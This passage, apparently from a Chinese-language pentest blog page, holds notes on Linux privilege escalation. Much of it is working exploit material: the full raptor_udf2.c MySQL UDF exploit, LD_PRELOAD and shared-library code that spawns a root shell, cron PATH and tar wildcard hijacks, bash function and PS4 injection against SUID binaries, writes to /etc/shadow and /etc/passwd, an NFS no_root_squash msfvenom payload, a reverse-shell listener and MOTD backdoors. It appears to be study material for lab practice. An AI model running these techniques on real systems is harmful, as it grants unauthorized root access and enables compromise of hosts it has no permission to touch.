pty.spawn(&#x27;/bin/bash&#x27;)&quot;stty raw -echo #raw 格式输出并关闭echo导致的命令显示两次export TERM=xterm-color\n\nrlwrap nc -lvnp 443用readlinewrap将我们的反弹shell包裹起来，防止上下翻历史记录时出现问题。\n常用方法bash version\nver&lt;4.2存在漏洞可以利用：可以在bash中定义函数并用路径组合做文件名。\nver&lt;4.4存在漏洞可以利用：环境变量插入。\n\nMySQL udfMySQL user defined function.\n提权条件\n有mysql账号，且有增删改查权限。最好有mysql root账号。\n\nsecure_file_priv 最好要为空，或者其指定目录能够利用。（该属性限定Load data、select into outfile、load_file()等操作）。（通过show variables like &#39;%secure_file_priv%&#39;查看）\n\n\n利用主要操作：写入’plugin’中。（show variables like &#39;%plugin%&#39;查到的目录）\n其他步骤在exp中有。\n/* * $Id: raptor_udf2.c,v 1.1 2006/01/18 17:58:54 raptor Exp $ * * raptor_udf2.c - dynamic library for do_system() MySQL UDF * Copyright (c) 2006 Marco Ivaldi &lt;raptor@0xdeadbeef.info&gt; * * This is an helper dynamic library for local privilege escalation through * MySQL run with root privileges (very bad idea!), slightly modified to work  * with newer versions of the open-source database. Tested on MySQL 4.1.14. * * See also: http://www.0xdeadbeef.info/exploits/raptor_udf.c * * Starting from MySQL 4.1.10a and MySQL 4.0.24, newer releases include fixes * for the security vulnerabilities in the handling of User Defined Functions * (UDFs) reported by Stefano Di Paola &lt;stefano.dipaola@wisec.it&gt;. For further * details, please refer to: * * http://dev.mysql.com/doc/refman/5.0/en/udf-security.html * http://www.wisec.it/vulns.php?page=4 * http://www.wisec.it/vulns.php?page=5 * http://www.wisec.it/vulns.php?page=6 * * &quot;UDFs should have at least one symbol defined in addition to the xxx symbol  * that corresponds to the main xxx() function. These auxiliary symbols  * correspond to the xxx_init(), xxx_deinit(), xxx_reset(), xxx_clear(), and  * xxx_add() functions&quot;. -- User Defined Functions Security Precautions  * * Usage: * $ id * uid=500(raptor) gid=500(raptor) groups=500(raptor) * $ gcc -g -c raptor_udf2.c * $ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc * $ mysql -u root -p * Enter password: * [...] * mysql&gt; use mysql; * mysql&gt; create table foo(line blob); * mysql&gt; insert into foo values(load_file(&#x27;/home/raptor/raptor_udf2.so&#x27;)); * mysql&gt; select * from foo into dumpfile &#x27;/usr/lib/raptor_udf2.so&#x27;; * mysql&gt; create function do_system returns integer soname &#x27;raptor_udf2.so&#x27;; * mysql&gt; select * from mysql.func; * +-----------+-----+----------------+----------+ * | name      | ret | dl             | type     | * +-----------+-----+----------------+----------+ * | do_system |   2 | raptor_udf2.so | function | * +-----------+-----+----------------+----------+ * mysql&gt; select do_system(&#x27;id &gt; /tmp/out; chown raptor.raptor /tmp/out&#x27;); * mysql&gt; \\! sh * sh-2.05b$ cat /tmp/out * uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm) * [...] * * E-DB Note: Keep an eye on https://github.com/mysqludf/lib_mysqludf_sys * */#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;enum Item_result &#123;STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT&#125;;typedef struct st_udf_args &#123;\tunsigned int\t\targ_count;\t// number of arguments\tenum Item_result\t*arg_type;\t// pointer to item_result\tchar \t\t\t**args;\t\t// pointer to arguments\tunsigned long\t\t*lengths;\t// length of string args\tchar\t\t\t*maybe_null;\t// 1 for maybe_null args&#125; UDF_ARGS;typedef struct st_udf_init &#123;\tchar\t\t\tmaybe_null;\t// 1 if func can return NULL\tunsigned int\t\tdecimals;\t// for real functions\tunsigned long \t\tmax_length;\t// for string functions\tchar\t\t\t*ptr;\t\t// free ptr for func data\tchar\t\t\tconst_item;\t// 0 if result is constant&#125; UDF_INIT;int do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)&#123;\tif (args-&gt;arg_count != 1)\t\treturn(0);\tsystem(args-&gt;args[0]);\treturn(0);&#125;char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message)&#123;\treturn(0);&#125;// milw0rm.com [2006-02-20]\n\n&#x2F;etc&#x2F;shadow什么时候用：手动枚举发现可读写，历史命令发现当前账号进行过操作。\n\n可读：用john破解\n可写：直接写入(使用mkpasswd -m sha-512 生成对应格式的hash值填入)\n\n&#x2F;etc&#x2F;passwd可写：openssl passwd &lt;passwd&gt;\nsudo 环境变量提权sudo -l发现存在环境变量env_keep+=LD_PRELOADS(LD&#x3D;link dynamic动态链接库)\n/* shell.c /* /* -fPIC place indepedent code/* 还需要以root权限执行一个命令（随便）随后就能在命令执行前预先执行动态链接库生成新/* 的root bash实现提权/* gcc -fPIC -shared -o shell.so shell.c -nostartfiles/* sudo LD_PRELOAD=/tmp/shell.so &lt;rootcommand&gt;*/#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt; //数据类型库#include &lt;stdlib.h&gt;void_init()&#123;    unsetenv(&quot;LD_PRELOAD&quot;); //执行一次就卸掉链接库    setgid(0);    setuid(0);    system(&quot;/bin/bash&quot;);    &#125;\n\n自动任务\n自动任务文件可写\ncat /etc/crontab\nls -la /etc | grep cron*\n\n环境变量路径可写且自动任务相对路径\n可写入crontab中$PATH变量中较前的路径。\n如果自动任务不是绝对路径，我们可以在较前的路径构造同名文件，实现劫持自动任务执行提权。\n#!/bin/bashcp /bin/bash /tmp/rootbashchmod +xs /tmp/rootbash\n\n自动任务通配符提权\n如果存在使用tar &lt;target&gt; *自动打包的自动任务\n我们可以通过--checkpoint-action利用\ntouch &lt;tar target&gt;/--checkpoint=1touch &lt;tar target&gt;/--checkpoint-action=exec=shell.elf\n\nSUIDfind / -type f -perm -u=s -ls 2&gt;/dev/null\n发现不常见的suid文件，我们可以使用strings查看其中字符串，strace以便后面利用。\n可执行文件直接gtfobins\n共享库注入提权so文件\n使用strings查看suid文件中可识别字符串发现使用到了so库文件\n使用strace追踪，使用2&gt;&amp;1将错误信息重定向到标准输出\n看他需要什么共享库，我们给他写一个\n/* lib.c /* gcc -fPIC -shared -o lib.so lib.c*/#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;static void inject() __attribute__((constructor));void inject()&#123;    setgid(0);    setuid(0);    system(&quot;/bin/bash -p&quot;);    &#125;\n\n环境变量利用用strings查看suid文件时时发现其中使用相对路径而非绝对路径。\n直接起一个一样的名字给他劫持掉。\n/* sameName.c /* gcc -o sameName sameName.c/* export PATH=.:$PATH*/#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void main()&#123;    setgid(0);    setuid(0);    system(&quot;/bin/bash -p&quot;);    &#125;\n\nSUID-shell 功能提权\nbash --version小于4.2\nfunction /usr/sbin/service &#123; /bin/bash -p; &#125;export -f /usr/sbin/service //导出函数以劫持// 此处执行suid文件\n\nbash --version小于4.4\n# env 设置环境变量# -i 忽略现有的环境变量 # SHELLOPTS=xtrace用于命令执行前将其打印并插入其他语句# PS4 指定提示符env -i SHELLOPTS=xtrace PS4=&#x27;$(cp /bin/bash /tmp/rootbash;chmod +xs /tmp/rootbash)&#x27; &lt;any file set suid&gt;\n\n密码和密钥历史\n用history查看历史记录中是否遗留着密码\ncat ~/.*history | less用less列出当前用户家目录下所有与history相关的文件\n如果viminfo可以查看， 里面可能存在编辑时留下的密钥信息\n查看各种vpn配置文件(.ovpn)，网页配置文件(wp-config.php)等\n根目录下.ssh文件夹中可能存在私钥\n\nNFS提权NFS &#x3D; Network File System 常用于网络上文件共享。NFS即可用于获取初步立足点，也可用于提权。信息收集时要注意（一般绑在RPC端口上）。\n\ncat /etc/exports 查看NFS具体配置。如果有no_root_squash选项，很可能可以用于提权。\n\n在攻击机上挂载一下\nmkdir /tmp/nfsmount -o rw,vers=3 &lt;nfsip:/tmp&gt; /tmp/nfs #&lt;nfsip:/tmp&gt;在配置文件中得来cd /tmp/nfs su# 以root身份向其中插入我们的reverse shellmsfvenom -p linux/x86/exec CMD=&quot;/bin/bash -p&quot; -f elf -o /tmp/nfs/shell.elf\n\n在靶机中执行即可\n\n\n内核提权必须提一嘴，内核提权不太稳定，很容易搞崩机子，使用前要三思。此外，内核提权和抽奖挺像，要有耐心，选择有效的exp最关键。没有注释的exp慎用。\ndirtyCow不是很稳定。\nLinux Kernal 2.6有一个著名的内核提权漏洞UDEV。\ndoas less + vi提权\nfind / -perm -u=s -type f 2&gt;/dev/null\n在openBSD等一部分系统中，会用到doas作为特权操作，如果当前用户有操作doas的权限，可以考虑提权。\ncat /etc/doas.conf 查看不需要密码执行的doas操作。\n如果可以使用less，那我们在less中可以按v进入vi编辑模式以root权限进行文件操作。\n在vi模式中:!sh可以起一个新的shell，doas root则是root shell。\n\n利用MOTD机制提权 motd &#x3D; message of the day\n\ncd /etc/update-motd.d/ ; ls -la\ncat /etc/00-header\n如果可编辑则写入反弹shell或者其他提权语句都可。\n\n可预测PRNG暴力破解SSH提权prng &#x3D; pseudo random number generator\n如果拿到了ssh公钥，可以考虑使用伪随机数生成器暴力碰撞破解。\n可以在searchsploit中查找prng但是要注意openssl版本。\n下载下来公私钥库后 直接选择拿到公钥的一部分 grep -lr 递归列举文件搜索，找到对应的公私钥对。\n","categories":["Pentest"],"tags":["pe_notes"]}]